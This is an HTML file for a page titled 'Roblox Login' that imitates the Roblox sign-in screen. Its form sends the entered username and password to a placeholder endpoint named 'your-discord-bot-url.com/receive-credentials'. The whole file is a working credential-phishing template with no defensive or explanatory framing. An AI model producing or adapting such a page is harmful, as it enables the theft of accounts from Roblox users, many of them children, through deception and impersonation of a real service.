<!DOCTYPE html>
<html>
<head>
    <title>Roblox Login</title>
    <style>
        body { font-family: Arial, sans-serif; }
        .container { width: 300px; margin: 0 auto; padding: 20px; border: 1px solid #ccc; border-radius: 5px; }
        .container h1 { text-align: center; }
        .container form { text-align: center; }
        .container input { width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #ccc; border-radius: 5px; }
        .container button { width: 100%; padding: 10px; margin: 10px 0; border: none; background-color: #28a745; color: white; font-size: 16px; border-radius: 5px; }
        .container button:hover { background-color: #218838; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Roblox Login</h1>
        <form action="https://your-discord-bot-url.com/receive-credentials" method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
